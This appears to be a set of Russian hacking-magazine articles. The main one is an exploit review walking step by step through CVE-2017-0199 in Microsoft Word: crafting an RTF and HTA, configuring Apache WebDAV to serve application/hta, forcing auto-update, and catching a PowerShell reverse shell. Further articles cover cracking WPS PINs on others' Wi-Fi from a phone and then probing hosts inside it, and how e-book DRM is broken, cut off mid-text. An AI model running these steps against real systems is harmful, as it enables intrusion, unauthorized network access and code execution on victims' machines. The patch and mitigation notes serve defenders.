141:       <filter‐class>com.vmware.vim.stats.webui.filter.StatsC
hartServletSecurity</filter‐class>
142:    </filter>
143:    <filter‐mapping>
144:       <filter‐name>StatsChartServletSecurity</filter‐name>
145:       <url‐pattern>/StatsChartServlet</url‐pattern>
146:    </filter‐mapping>

В поисках полного URL автор уязвимости снифал трафик между клиентом
и сервером vCenter. Они общаются при помощи технологии BlazeDS, которая
использует бинарный протокол AMF разработки Adobe.
  Я же предлагаю просто погуглить StatsChartServlet.  :) Метод, воз‐
можно, не такой элегантный, одна ко действенный. Среди ссы лок ты навер‐
няка отыщешь различные багрепорты в VMware, где среди прочего приводит‐
ся полный URL: /statsreport/StatsChartServlet. Ну и самые сооб‐
разительные могут просто посмотреть на путь, по которому лежат файлы.
   Теперь осталось отправить стандар тный для уязвимости в Struts 2 вектор
RCE на найденный адрес, и код успешно выполнится.





                Успешная эксплуатация VMware vCenter


TARGETS
 • VMware vCenter <= 6.0 U2a;
 • VMware vCenter <= 6.5.0b.


SOLUTION
Для обеих веток продукта разработчики выпустили патчи, устраняющие уяз‐
вимость.
ВЗЛОМ


                 ← НАЧАЛО СТАТЬИ
ОБЗОР
ЭКСПЛОИТОВ
    АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ

ВЫПОЛНЕНИЕ ПРОИЗВОЛЬНОГО КОДА В MICROSOFT WORD ВЕРСИЙ
С 2007 ПО 2016

 Дата релиза: начало апреля 2017 года
 CVE:         CVE‐2017‐0199
 Автор:       N/A


BRIEF
Ошибка связана с некорректной обработкой ответов от сервера в функции
Microsoft OLE (Object Linking and Embedding), которая дает возможность
встраивать одни документы внутрь других. После открытия зараженного
документа приложение офиса делает запрос на удаленный сервер, что бы
получить встроенный в этот документ файл. Сервер возвращает специально
сформированный ответ. В нем содер жится вредоносный файл HTA, код
из которого после загрузки выпол няет ся на целевой системе.



                   https://vimeo.com/220105198




EXPLOIT
История этой уязвимости запутанна, как шнур наушников, про лежавших
целый день в кармане. Так как 0day был обнаружен в диком виде, спе куляции
и теории загово ра пошли почти сразу. Некоторые исследовательские ком‐
пании утверждают, что уязвимость использовалась спецслужбами для атаки
на высшие чины и госструктуры. Не обошлось и без упо минания в СМИ
популярного нынче «русского следа». Существу ет еще версия о том, что в Mi‐
crosoft знали об уязвимости и не исправляли ее намеренно. Исследователь
Райан Хэн сон, например, заявляет, что обнаружил эту уязвимость еще в июле
прошлого года, а репорт о ней отправил в октябре.
   Если тебе интересна вся эта детективная история, то ты без труда смо‐
жешь нагуглить массу самых разных подробностей и попытаться сде лать
вывод самостоятельно. Я же разберу только детали уязвимости, оставив
остальную мишуру за бортом.
  Предлагаю шаг за шагом пройтись по пути от создания экспло ита до его
применения. Для начала нам нужно создать валидный документ RTF с любым
содержимым. Это можно проделать в любом мало‐мальски продвинутом
редакторе, хоть в том же Word. Сохраним документ как exp.rtf.
  Далее создаем приложение exp.hta с полезной нагрузкой внутри. HTA
(HTML Application) — это по своей сути обычный HTML, который не ограничен
моделью безопасности веб‐браузера. Он рен дерится с повышенными при‐
вилегиями, потому что априори считает ся надежным и безопасным приложе ‐
нием. В нем позволено использовать код на VBScript и JScript, отсю да
широкие возможности для манипуляции файлами, папками, клю чами реестра
и так далее. Поэтому такой формат часто используется для доставки вре‐
доносного кода в различных червях и прочих троянах.
  Я использую самый обычный бэкконнект‐шелл через PowerShell для дос‐
тавки на атакуемый хост.





         Полезная нагрузка в виде VBScript в HTA‐приложении

Не забывай, что в качестве аргумента для ключа ‐e (EncodedCommand) необ‐
ходим не православный UTF‐8 Base64, а двухбайтовый UTF‐16‐LE Base 64.
С помощью коман ды [Convert]::ToBase64String([System.Text.Encod‐
ing]::Unicode.GetBytes('YOUR_SCRIPT_HERE')) сам PowerShell поможет
тебе скон вертировать скрипт в нужный фор мат.
  Следующий шаг — создание и настройка веб‐сервера. Это нужно
для того, чтобы внедрить документ exp.rtf как ссыл ку на контролируемый нами
сервер. Не мудрствуя лукаво, я использовал Docker, а в качестве ОС выбрал
Debian. Дальше я развернул самый обычный Apache.


apt‐get update && apt‐get install ‐y apache

Word любит WebDAV и в процессе внед рения документа будет отправлять
на сервер запрос PROPFIND. Поэтому я соответствующим образом настро ил
Apache.


a2enmod dav dav_fs dav_lock headers

Обязатель но включаем модуль headers, он нам очень пригодит ся во время
эксплуатации уязвимости. Дальше нужно отредактировать конфиг хоста.
Включаем WebDAV на корневую директорию.
  Сейчас мы заставляем Word думать, что мы передаем ему RTF‐документ.
Ну, по сути, так оно и есть. :)


    <Directory /var/www/html/>
        Dav on
    </Directory>

Загружаем в веб‐рут соз данные нами файлы exp.rtf, exp.hta и перезапускаем
веб‐сервер.


service apache2 restart

Открываем Word и создаем новый документ. Я использую Oﬃce 2016, так что
все скриншоты и пути актуальны именно для этой версии пакета. Перехо дим
на вкладку «Вставка» и выбираем «Объ ект». Добро пожаловать в самоучитель
Microsoft Word. ;) Далее указываем URL до файла exp.rtf и не забываем отме ‐
тить галочкой пункт «Связь с файлом».





        Встраивание файла с удаленного сервера в документ Word

После нажатия ОK мы видим, что подгрузился текст из документа. Логи апача
это подтверждают. Сохраняем документ в фор мате RTF, я назвал его
exploit.rtf.





          Word забрал файл с сервера и добавил его в документ

Закрываем Word и возвращаемся к веб‐сер веру. Редактируем файл кон‐
фигурации хоста и добавляем к каждому ответу сервера заголовок Content‐
Type: application/hta.


    <Directory /var/www/html/>
        Header set Content‐Type "application/hta"
        Dav on
    </Directory>

Для чего это нужно? Тут‐то и кроется вся суть уязвимости. Дело в том, что Mi‐
crosoft OLE использует COM‐объект URL Moniker для доступа к свя занным
документам, которые расположены на удаленном сервере. Только вот прог‐
рамма для обработки контента выбирается исходя из переданного сервером
MIME‐типа. Причем некоторые из них могут быть очень опасными. Например,
наш покорный слуга application/hta передает управление программе
mshta.exe, а выполнение документа такого типа равносильно выполнению
произвольного кода.





    Указатель на CLSID URL Moniker в документе с внедренным объектом

Дальше меняем содержимое слинкованного файла exp.rtf на содержимое
exp.hta:


cat exp.hta > exp.rtf

Расширение файла оставляем прежним, ведь Word будет обращаться именно
к нему. Перезапускаем демон Apache и откры ваем файл  exploit.rtf. Если
теперь два раза щел кнуть на внедренный документ, то выполнится код, ука‐
занный в HTA‐приложении. В моем случае отработал бэк коннект‐шелл.





            Эксплоит выпол нился успешно. Поймали коннект

Чтобы эксплоит отрабаты вал автоматически, нужно добавить строку objup‐
date в файл  exploit.rtf между objautlink и rsltpict. Таким образом,
при загрузке Word автоматически попытается обновить прилинкован ный
файл, и код выпол нится. Причем режим «защищенного просмотра» совсем
не защищает от этой атаки.





   «Включаем» автоматическое срабатывание эксплоита после откры тия

Можно заметить, что Word выдает диалоговое окно с вопросом, обновить ли
информацию из свя занного файла, однако сплоит уже сделал свое черное
дело.





  Эксплоит отрабатывает сразу после открытия документа. Вопрос
  про обновление слегка запоздал :)

Экземпляры гуляющих в Сети вредоносов, разумеется, используют раз‐
личные техники сокрытия своей деятельности. Чтобы пользовате ля не сму‐
тили выскочившие окна, изменяется размер окна HTA‐приложения, убивается
вордовский процесс, в котором отработал эксплоит, и запускается новый —
с фейковым документом. Но это уже сов сем другая исто рия, которая выходит
за рамки обзора.
  Напоследок хочу добавить, что уязвим не только один Word, но также все
приложения Microsoft Oﬃce, которые поддерживают внед рение объектов.





                      Эксплуатация PowerPoint


TARGETS
Microsoft Oﬃce версий с 2007 по 2016.


SOLUTION
В рамках вторника исправлений 11 апреля компания Microsoft выпустила пат‐
чи для всех версий продуктов. В качестве временной меры можешь переназ‐
начить обработчик application/hta таким образом, чтобы приложения
обрабатывались как обычный текст. Для этого нужно внести следующие
изменения в реестр.


Windows Registry Editor Version 5.00
[HKEY_CLASSES_ROOTPROTOCOLSFilterapplication/hta]
"CLSID"="{5e941d80‐bf96‐11cd‐b579‐08002b30bfeb}"

На этом все.
ВЗЛОМ
 ЛОМАЕМ
    WI-FI
           СО СМАРТФОНА





                                                                                     84ckf1r3  РАЗВЕДКА И ПЕРВЫЙ БОЙ                                                                                        84ckf1r3@gmail.com




Наверняка ты уже занимал ся взломом беспроводных сетей
с ноутбука и замечал, что таскать его не слишком удобно,
да и внимание он привлека ет. Но зачем ноутбук, если у тебя
есть настоящий карманный компьютер, с помощью которого
вардрайвингом можно  заниматься,  не  палясь  вообще!
В этой статье мы выполним подготовку и раз берем простые
атаки, а в следующей перейдем к действительно тяжелой
артиллерии.


           WARNING

                      Практика показывает, что большинство взломов
                       совершается самыми примитивными методами.
                       Автор  лишь  рассуждает  о  технических  воз‐
                     можностях взлома и не призыва ет тебя так дей ‐
                        ствовать. Есть  только один способ  научиться
                      эффективно отражать сетевые ата ки — это выпол‐
                         нять их самому и ста вить себя на мес то ата‐
                    кующего.  Иначе  любой  аудит  превращается
                        в фиктивную проверку на соответствие стан‐
                        дартам.



АРСЕНАЛ
Все, что потребуется для быстрого старта, — минимально подготовленный
смартфон или планшет с ОС Android. Если не стоит задача взломать опре‐
деленную и хорошо защищенную сеть, а хочется просто под ключиться к зак ‐
рытому вайфаю поблизости, этого будет достаточно.
  Первичную разведку эфира можно проводить на устройствах с Android
2.3–4.4, а начиная с Android 5.0 появилась воз можность выполнять простей‐
шие WPS PIN атаки даже без рута. Просто ставишь пару приложений
и нажимаешь кнопку «сделать как надо». Но самое интересное, как всегда,
кроется в деталях.


ГОТОВИМСЯ К АТАКЕ
Существует множество типовых атак на точки доступа Wi‐Fi и специфических
эксплоитов для определенных моделей с конкрет ными версиями прошивок.
К типовым относятся методы подбора WPS PIN, вычисление ключей WEP
и WPA2 по анализу перехваченных пакетов, а также принудительное перек ‐
лючение AP на более слабый алгоритм шифрования (WEP вместо WPA).
  Особняком стоят методы социального инжиниринга: создание поддель‐
ных AP (иден тичных атакуемой) для получения пароля от настоящей или же
для проведения различных MitM‐атак, а также деав торизация/глушение бес‐
проводных клиентов и DoS как самостоятельные цели.
  Самый универсальный способ атаки на точку доступа — вычисление ее
ключа WPA2 по отдельным сообщениям (M1‐M4) из перехваченных хен дшей‐
ков. Он срабатывает практически всегда, но требует больших затрат (особен‐
но времени). Перехват «рукопожатий» всегда выполняется в режиме монито‐
ринга, который поддерживает далеко не каждый  Wi‐Fi‐чип и драйвер.
Для ускорения сбора хендшейков потребуется функция инжекта пакетов,
которая деавторизует подключенных к AP клиентов и заставляет их чаще
отправлять «рукопожатия». Она и вовсе встречает ся у единич ных Wi‐Fi‐
модулей.
  За редким исключением предустановленные  в смартфон драйверы
не позволяют даже запускать режим мониторинга, да и альтернативные драй‐
веры для встроенных чипов есть не всегда. Поэтому для взлома чаще исполь‐
зуют внешние USB Wi‐Fi адаптеры с hacker friendly чипами (преимущественно
от Atheros и Ralink). Подробнее смотри в статье «Вы бираем бюджетный адап‐
тер для взлома Wi‐Fi».
  Однако есть и обходной  путь, не требующий покупки оборудования
или мучений с драйверами. У многих точек доступа с надежной защитой (вро‐
де WPA2 PSK CCMP) порой ока зывается разрешен WPS — дополнительный
вариант авторизации по пин‐коду. Этот пин часто остается дефолтным и лег‐
ко вычисляется.
   Теоретически у восьмизначного WPS‐пина всего 100 миллионов ком‐
бинаций, из которых уникальны только 10 миллионов, так как последняя циф‐
ра — контрольная и зависит от других семи. На прак тике же достаточно
перебрать только 11 тысяч вариантов из‐за уязвимостей самого алго ритма
(концептуально подобных найденным в LM‐хеше, подробнее здесь).
   Брутфорс 11 тысяч PIN‐кодов при хорошем уровне сигнала займет при‐
мерно полдня, поскольку на проверку одного пина тратится от двух до десяти
секунд. Поэтому на практике используются только самые быстрые атаки
на WPS — по дефол тным значениям пинов и по их сниженной энтропии (pixie
dust). Для противодействия брутфорсу пин‐кодов и под ключению к фейковой
точке доступа между AP и клиент скими устройства ми предусмотрен обмен
хешами. По задумке они дол жны вычисляться на основе WPS PIN и двух слу ‐
чайных чисел. На практике многие роутеры либо генерируют предсказуемые
числа, либо вовсе оставля ют их нулевыми. Энтропия резко снижается,
а механизм, задуман ный для усиления защиты, из‐за некорректной реали‐
зации лишь ослабля ет ее. Также некоторые производители задают WPS‐пин
как производное от других известных значений (в частности, MAC‐адреса).
Такие точки доступа вскрывают ся практически мгновенно.
   Актуальность WPS‐атак состоит еще и в том, что в некоторых точках дос‐
тупа функция Wi‐Fi Protected Setup включена по умол чанию и не отключается
штатными средствами. Из‐за кривой прошивки девайса либо в его меню нас‐
троек  нет  соответствующего  пункта,  либо  положение  перек лючателя
Enable/Disable в нем не играет роли. Видимо, это одна из причин того, почему
в любом городе среди множества «защищенных» беспровод ных сетей до сих
пор хватает легких целей.


РАЗВЕДКА
Весь процесс вардрайвинга можно разделить на два этапа: сбор информа‐
ции о точках доступа и непосредственно их взлом. Существует множество
способов  просканиро вать  беспровод ные  сети  со  смартфона,  но  по
информативности они сильно отличаются. Одни программы показывают
просто SSID и уровень сигнала подобно системному приложению, а другие
отображают все парамет ры найденных AP. В частности, указывают тип защиты
и позволяют фильтровать список по разным критериям.
  Среди таких приложений я бы рекомендовал использовать WiFinspect. Он
написан под руководством доктора Тома Клосиа (Tom Clothia) из Бирмингем‐
ского университета в 2012 году. Текущая версия 1.2 позволяет выполнять
аудит согласно стандарту безопасности дан ных PCI DSS 2. С ней ты получишь
исчерпывающую информа цию о режимах работы найденных точек доступа
Wi‐Fi, сможешь сра зу же выпол нить их простейший пентест по дефолтным
паролям и многое узнать о подключенных устройствах. Приложе ние бесплат‐
ное и не содержит рекламы, однако для большинства его функций потребу‐
ется root.





                           Аудит в WiFinspect

Допол няет WiFinspect другое популярное приложение — Wiﬁ Analyzer. Оно
умеет сканировать диапазоны 2,4 и 5 ГГц и работает без прав суперполь‐
зователя. Wiﬁ Analyzer отобража ет кучу данных, включая номер канала выб‐
ранной AP, ее MAC‐адрес, производителя (вычисляется по MAC), и так же
деталь но расписывает типы шифрования. Для этого достаточно отметить
в настройках «Показывать полный уровень безопасности». Минус у прог‐
раммы один — навязчивая реклама во всех окнах Wiﬁ Analyzer. Ее можно
убрать при помощи AdAway (но тогда все рав но понадобится root) или купив
платную версию.





                Wiﬁ Analyzer показы вает AP и их параметры

Оба приложения  отлично дополняют  друг  друга, работая  прак тически
на любом девайсе с Android 2.3 и новее. Они удобны для разведки эфира
и предварительного выбора целей. Все найденные AP можно отсортировать
по уровню сигнала и степени защиты. Так сразу определяются наиболее дос‐
тупные AP.
  В Google Play есть и опенсорсный WiFiAnalyzer . Он бесплатный, без рек‐
ламы, умеет фильтровать AP по типу защиты и даже пытается вычислить рас‐
стояние до них в метрах (как если бы они все вещали прямой навод кой).
Однако в нем нет режима «охоты на лис» — непрерыв ного измерения уровня
сигнала выбранной точки доступа. В остальном программа идентична.


             INFO

                    Интересно,  что  некото рые  вла дельцы  прос то
                      скрывают  SSID  своей  беспро вод ной   сети,
                      не утруждая себя настройкой авторизации. Дру‐
                        гие настраивают строгую авто ризацию в диапа‐
                       зоне 2,4 ГГц, но нап рочь забывают о параллельно
                       работающем 5 ГГц. Среди двух диапазонных точек
                      доступа встречаются и такие «полузакрытые».



ПОДВОДНЫЕ КАМНИ
Успешность разведки зависит от установленного в смартфоне модуля бес‐
проводной связи. Он может иметь как аппарат ные, так и программные огра‐
ничения. Аппаратные касаются чувстви тельности приемника и под держки им
различных стан дартов из набора IEEE 802.11. Далеко не во всех смартфо нах
есть двухдиапазонный Wi‐Fi. Программные же часто зависят от используемо‐
го драйвера и установленного региона.
  Про драйверы поговорим в следующей части, а пока обрати внимание
на один не самый очевидный момент: в разных регионах земного шара
выделены свои диапазоны частот в рамках единого стандарта. Например,
для 802.11b/g/n это 2412–2484 МГц или 14 частотных каналов с шагом
базовой частоты 5 МГц. Однако в России 14‐й канал использовать зап‐
рещено, а 12‐й и 13‐й — не рекомендует ся из‐за того, что при ширине канала
в 20–40 МГц слишком велик риск возникновения помех на запрещенной час‐
тоте. Сходная ситуация сложилась на Украине и в других странах бывшего
СССР. Поэтому практически все оборудование с поддержкой Wi‐Fi, пред‐
назначенное для региона СНГ, де‐факто работа ет только на каналах 1–
11 или даже 1–10.
  Этим осторожно (и не всегда законно) пользуются продвинутые тех нари
в своих интересах. К примеру, одна фирма под ключает на каналах 12–13 бес‐
проводное оборудование для видеонаблюдения, чтобы минимизировать
помехи от сосед них AP. Вардрайверы же просто меняют региональные нас‐
тройки и получают доступ к «закрытым» каналам. Подсказка: в Японии пока
разрешены все 14.


             INFO

                        Тех нически  беспроводную   связь  по   стан‐
                      дартам 802.11b/g/n можно организовать и на
                       нестандартных частотах (ниже 2412 МГц), но для
                        этого потребуется специфи ческое оборудование
                      и лицензия, а не просто раз решение местного
                      радиочастотного центра. Шанс получить такой
                        пакет документов у частного лица практичес ки
                        нулевой.



ПЕРВЫЙ БОЙ
В  Google  Play  полно  программ  для перебора  WPS‐пинов,  поскольку
это единственная атака, работающая на любом рутованном телефоне (до
версии Android 4.4) и даже без рута (начиная с Android 5.0). Однако боль‐
шинство из этих приложений написаны абы как, и их прак тическая польза
очень сомнительна. К примеру, WPSbr Free зачем‐то пытается перебирать
все 100 миллионов пин‐кодов, проверяя их по два раза даже при хорошем
уровне сигнала. Полный перебор таким способом займет примерно 16 лет,
но большинство AP заблокируют лобовую атаку гораздо раньше. После оче‐
редного неверного пин‐кода клиентское устройство попадет в черный спи‐
сок, и для продолжения брута придется менять MAC‐адрес.





                     Бессмысленный перебор

Более корректный под бор пинов выполняет программа WPSApp. Она поз‐
воляет отфильтровать все найденные точки доступа. Оставляет в списке
только имеющие активный WPS и сортиру ет их по убы ванию SNR.





                        Список целей

Все потенциально уязвимые точки доступа в WPSApp отоб ражаются знаком
вопроса. Для них предлагается попробовать один из пяти дефолтных
пин‐кодов. Автор программы не стал заморачиваться со скриптом перебора
и предложил сделать это вручную, зато двумя способа ми — с рутом и без.
   Если же дефол тный пин‐код заранее известен (вычисляется как про‐
изводное от MAC‐адреса по алгорит му ComputePIN), то такая точка доступа
отмечается зеленой галочкой.





                   Вычисленный WPS PIN

Если пин‐код подошел, то ты сразу получишь пароль к Wi‐Fi (WPA‐PSK),
каким бы сложным и длинным он ни был. Пароль можно сохранить и перейти
к следующей точке доступа. Спустя какое‐то время твой телефон сможет
использовать Wi‐Fi там, где раньше ловил только 3G/4G.





                  Успешный подбор WPS PIN и пароля





                  WPSApp видит скры тые сети
                   ← НАЧАЛО СТАТЬИВЗЛОМ
ЛОМАЕМ
    WI-FI
     СО СМАРТФОНА
              РАЗВЕДКА И ПЕРВЫЙ БОЙ



Чуть более продвинутая утилита — WiFree WPS. По сути это гиб рид WPS PIN
и Router Keygen. В нее зашито больше дефолтных пинов и паролей доступа
к маршрутизаторам, а также есть функция их автоматического перебо ра.
Плюс она показывает сохраненные пароли Wi‐Fi и все настройки текущего
подключения.





   Мгновенное вычисление пароля для Zyxel Keenetic с дефолтным пином

Интерфейс у программы аляповатый, но довольно информативный. Она ана‐
лизирует тип защиты, производителя и уровень сигнала всех найденных точек
доступа. Зеленым отображаются AP с наиболее высокой вероятностью взло‐
ма. Серым — те AP, на которых стоит переб рать 10–20 стандартных пинов,
а красным — те, которые быстро вскрыть не удастся. Например, у них очень
низкий уровень сигнала или вовсе отсутствует авторизация по WPS PIN.
В WiFree WPS доступно два режима ата ки: с рутом (требуется патч и BusyBox)
и без рута (работает на Android 5.0 и выше, причем быстрее, чем в аналогич‐
ных программах).





             Автоматический перебор пинов в WiFree WPS

Если в базе данных программы нет дефолтных пин‐кодов для устройств дан‐
ного производителя, такая точ ка доступа будет отображаться красным. Ты
можешь попробовать подключиться к ней, вводя WPS PIN вручную. Помешать
успешному взлому могут и другие факторы: низкий уро вень сигнала, режим
WPS‐авторизации по нажатию кнопки, изменение дефолтного пина, фильтра‐
ция по MAC‐адресу.





             Еще один роутер Zyxel с дефол тным пином

После того как ты подобрал WPS PIN и узнал пароль точки доступа, можно
подключаться к ней и изучать беспровод ную сеть. Для этого рекомендую
использовать бесплатный набор утилит Fing — Network Tools.
  Приложение имеет аккуратный и наглядный интерфейс, а все пункты меню
говорят сами за себя. Например, можно просканировать точ ку доступа
и узнать о ней массу деталей.





                    Fing показы вает инфу о точке доступа

Затем разослать ARP‐пакеты и обнаружить все подключенные хосты в этой
беспроводной сети (в том числе и твой смартфон).





               Fing показывает все хосты в беспроводной сети

Посмотреть доступные сервисы и открытые порты на любом узле в этой сети.





               Fing определяет доступные сервисы на роутере

Fing даже предлагает сра зу же подклю читься к любому из них, например
по Telnet.





             Подключаемся по Telnet к найденным хостам

Простор для фантазии здесь открывает ся очень большой. Можно даже уда‐
ленно включить спящее устройство, если оно поддерживает технологию
Wake‐on‐LAN, или устроить общую побудку широковещательным запросом
WOL.





                             Fing трубит подъем!


Ищем зону уве рен ного при ема
Вероятность успеха любой атаки на точ ку доступа зависит от мощности ее
сигнала. Точнее, от соотношения сигнал/шум (SNR), которое ты регистри‐
руешь в кон кретном месте. На практике если уровень сигнала ниже –75 дБи,
то лучше найти зону более уверенного приема или поискать другие цели.
Не всегда стоит пытаться приблизиться к AP в надежде получить более ста‐
бильную связь. Иногда ты ока зываешься ближе к источнику помех (мик ровол‐
новке или другой AP на соседнем канале), а отражен ный сигнал достаточной
мощности ловит ся за углом или в совершенно неожиданном месте. Найти его
поможет режим непрерывного измерения уровня сигнала в Wiﬁ Analyzer.





          Ищем уверенный прием с помощью Wiﬁ Analyzer





ЧТО ДАЛЬШЕ?
В следующей статье мы расскажем, как обойти некоторые ограничения,
и займемся более продвинутыми атаками с помощью серьезных инструмен‐
тов. Для продвинутых атак потребуется root, установленный набор консоль‐
ных утилит (BusyBox), руч ная доустановка не вошедших в BusyBox программ,
собственно эмулятор терминала, USB‐OTG (софтовый + кабель), внешние
USB Wi‐Fi адаптеры на определенных чипах, драйверы модулей беспровод‐
ной связи с поддержкой режима мониторин га (обязательно) и инжекта
пакетов (желательно), пат чи ядра, подготов ленные дистрибутивы Linux, смон‐
тированные в chroot, и побольше терпения.


        WWW

                         •WiFinspect
                   •WPSApp
                       •WiFree WPS
ВЗЛОМ

    КНИЖНЫЙ
 DRM





  КАК ЗАЩИЩАЮТ ЭЛЕКТРОННЫЕ КНИГИ
    И КАК ИХ ЗАЩИТУ ВЗЛАМЫВАЮТ



Adobe, Amazon, Barnes & Noble. Все эти
компании   прилагают   массу   усилий
для защиты электронных книг от копиро ‐
вания  и  распространения  в  интернете.
                                                                              Олег АфонинОднако каждый раз находятся способы ее
обойти или взломать. Как работа ет такая
защита, как ее взламывают и какие аль тер‐
нативные способы принуждения к покупке
(в противовес краже) используют компании
вместо DRM — обо всем этом поговорим
в сегодняшней статье.


Электрон ные книги решают многие проб лемы. Не нужно рубить деревья,
тысячи книг умещаются на карте памяти размером с ноготь, а электронные
читалки доступны любых форм и размеров, при этом их сто имость, если
говорить об американском рынке, сопоставима со сто имостью десят ка
бумажных изданий. Неудивительно, что еще в 2011 году объем продаж элек‐
тронных книг в магазине Amazon в США превысил объем продаж печатных
изданий сперва в США, а буквально через год — и по всему миру.
  Однако в 2015 году энтузиазм покупателей пошел на спад, а в 2016‐м
наметились просто‐таки тревожные тенденции. Сперва замедлился рост про‐
даж электронных изданий, а потом и вов се продажи начали падать. Что слу ‐
чилось?
  Свою роль здесь сыграла простейшая комбинация фак торов: стоимость
электронных изданий в крупных магазинах (Amazon, Barnes & Noble) почти
догнала по цене бумажные книги, но ограничений у электронных изданий куда
больше.
  Например, возьмем Amazon. Что можно сделать с купленной на Amazon
бумажной книгой? Да что угодно. Ее можно прочитать, одолжить другу,
наконец — подарить, до или после проч тения. Ненужные книги можно сдать
в макулатуру или отдать в библиотеку, где к ним получит доступ еще сколь‐
ко‐то читателей.
  А что можно сделать с купленной на Amazon электронной книгой? Ее мож‐
но скачать на авторизованное устройство (любой планшет или телефон
на Android и iOS или читалку на E Ink, если она Kindle) и прочитать. В некото ‐
рых случаях книгу можно одолжить другому пользователю, у которого также
есть учетная запись Amazon. Впрочем, даже когда подобное разрешено,
одал живать книги можно нечасто и ненадол го. Еще книгу можно удалить
из своей библиотеки. На этом воз можности закан чиваются.
   Электрон ные книги прекрасно продавались пять лет назад, но на сегод ‐
няшний день продажи «электронки» у крупных магазинов падают, а перспек‐
тивы электронных продаж уже не выглядят так радужно. Цены на «электронку»
постепенно докарабкались до цен на бумажные издания, а присущие элек‐
тронным форматам ограничения никто и не подумал снять. Ситу ация дошла
в своей абсурдности до предела после того, как студенты американских уни‐
верситетов дружно проигнорировали электронные учебники: при том что
в электронном виде учебные материалы можно было купить на 20–30%
дешевле бумажных, электронный учебник невозможно ни продать в конце
учебного года, ни купить со скидкой в букинистическом отделе. При цене
учебников, исчисля ющейся десятками долларов, стоимость пользования
электронными версиями замет но превышала стоимость владения «бумагой».
   Что же мешает студентам, да и простым читателям, делиться книгами
в электрон ной форме? Три буквы: DRM. Термином Digital Rights Management
(DRM) обозначают различные виды защиты, с помощью которых правооб‐
ладатели контролируют использование лицензиатом (уже не покупателем!)
защищен ного материала. Для электронных книг в качестве DRM чаще всего
используется шифрование, но и здесь ситу ация далеко не однозначна. Давай
посмотрим, какие именно системы DRM используются в мире, а какие —
у нас в стране.


PDF: ПРАДЕДУШКА ЦИФРОВЫХ КНИГ
Да, все правиль но: одним из первых фор матов электронных книг, в котором
поддерживался DRM, был Adobe PDF. У компании «Элкомсофт», в которой
работает автор этих строк, особо трогательное отношение как к формату, так
и к ком пании Adobe: именно после успешного взлома DRM‐защиты Adobe
PDF разработчик Дмитрий Скляров оказался в американской тюрьме, а ком‐
пания ввязалась в многомесячную тяжбу с Фемидой. Дмитрия арестовали
во время поездки в США, где он делал доклад по особенностям защиты
и взлома PDF, на следующий день после доклада на выходе из оте ля (когда
он собрал вещи и направлял ся в аэропорт). И даже окончательное судеб ное
решение Not guilty — «невиновен» — никак не компенсировало затраты нер‐
вов, времени и денег.
  Сегодня же нам ничего не грозит, и особенности защиты формата PDF
можно спокойно и безопасно обсуждать на стра ницах журнала. Если тебя
действительно заинтересует тема шифрования, взлома и снятия защиты
с PDF‐файлов, рекомендую книжку, написан ную Дмитрием Скля ровым, —
«Искусство защиты и взлома информации» (СПб., 2004). По иронии судьбы,
в электронном виде книга распространяет ся имен но в формате Adobe PDF.
Следующие два раздела основаны на данных из книги.


ADOBE PDF MERCHANT (ACROBAT WEB BUY)
Не пропускай этот раздел! Хоть на сегод няшний день Adobe PDF Merchant
представляет исклю чительно исторический интерес (впро чем, как и вся
защита Adobe PDF DRM), именно этот формат позволяет понять, что собой
представляет защита DRM в применении к электронным изданиям. Основные
принципы защиты DRM с тех пор мало изменились; изменилась в основном
реализация.
  Поддержка электронных книг появи лась в виде подгружаемо го модуля
еще в Acrobat Reader 4.05, и первым таким модулем стал Acrobat Web Buy.
Работа модуля была основана на тесном вза имодействии между клиентским
устройством и сервером.





                            Acrobat Reader 4.05


Что происходило при попытке открыть защищенную книгу? Модуль отправлял
запрос на сервер DRM, который, собственно, и отвечал за управление пра‐
вами. На сервер передавалась информация о покуп ке документа и иден‐
тификатор вычислительной среды, с которой делался запрос. В качестве
идентификатора можно было использовать CPUID, серийный номер диска
или идентификатор учетной записи пользователя в соответствующем при‐
ложении (это важно, поскольку именно такая привязка исполь зует ся в сов‐
ременных схемах защиты).
  Сервер, в свою очередь, проверял легитимность доступа к документу.
Если проверка была успешно пройдена, сервер генерировал и отправлял
устройству файл в формате RMF (Rights Management Format), который пред‐
ставлял собой XML‐документ. В этом файле хра нился криптографический
ключ для расшифровки PDF, перечень разрешенных действий и сертификат
для проверки лицензии.
  Для проверки лицензии использовалось два ключа RSA длиной 1024 бит:
один из них принадлежал издателю, а второй использовался Adobe в качес‐
тве доверенного сертифика та, с помощью которого подписывался открытый
ключ издателя.
  Кроме того, в RMF‐файле обязательно присутствовало хотя бы одно усло‐
вие, которое требовалось для успешного доступа к документу. Таким усло ‐
вием могла быть привязка к учетной записи (идентификатору) пользователя,
CPUID или серийный номер железа. Кроме того, можно было проверить дату,
до наступления которой разрешался доступ к документу. Что интересно,
условия можно было комбинировать с помощью логических операций
AND и OR, что позволяло правообладателю, к примеру, сдавать PDF в аренду
на определенный срок.
  Система защиты была построена таким образом, что создать защищен‐
ный RMF‐файл (а значит — и защищенную электронную книгу) без участия
Adobe было невозможно (вспомним про второй ключ RSA). Зато, если в наши
руки попадал RMF‐файл, извлечь из него ключ шифрования было легче лег‐
кого.
  Очевидная ошибка в реализации DRM PDF Merchant в том, что ключ шиф‐
рования передавал ся клиенту в готовом виде, а проверка условий была ско‐
рее формаль ностью, которой занималась та или иная программная реали‐
зация. Расшифровать сам документ можно было очень легко, просто вытащив
ключ из RMF‐файла. Вся защита строилась на пред положении, что взлом‐
щику будет лень возиться с защитой. В целом систему PDF Merchant нельзя
считать надежной системой DRM.


ADOBE DRM (EBX)
Более свежая реализация от Adobe — защита электронных книг по про токолу
Electronic Book Exchange (EBX), который разрабаты вался организацией EBX
Workgroup. Идея здесь в том, что при активации приложе ния для чте ния элек ‐
тронных книг генерируется пара асимметричных ключей. Открытый ключ
регистрируется на сервере, а секретный сохраняется на устройстве поль‐
зователя. При покупке лицензии читалка получает так называемый ваучер —
XML‐файл, в котором содержится ключ документа. Этот ключ шифруется
с помощью откры того ключа пользователя. Кроме того, в ваучере содержится
список прав доступа к документу и информация для проверки под линности
ваучера.
  В этой схеме для расшифровки электронной книги нужен был доступ к сек ‐
ретному ключу пользователя (у самого пользователя доступа к нему не было,
только само приложение могло извлечь ключ). Причем сам ключ допол‐
нительно шифровал ся с помощью аппарат ных идентификаторов устройства,
что приводило к утрате лицензий при смене устройства. Для обхода этой
проблемы был предусмотрен дополнительный способ доступа к секретному
ключу, не зависящий от идентификаторов оборудования. Однако при исполь ‐
зовании этого способа идентификатор можно было довольно легко вычис‐
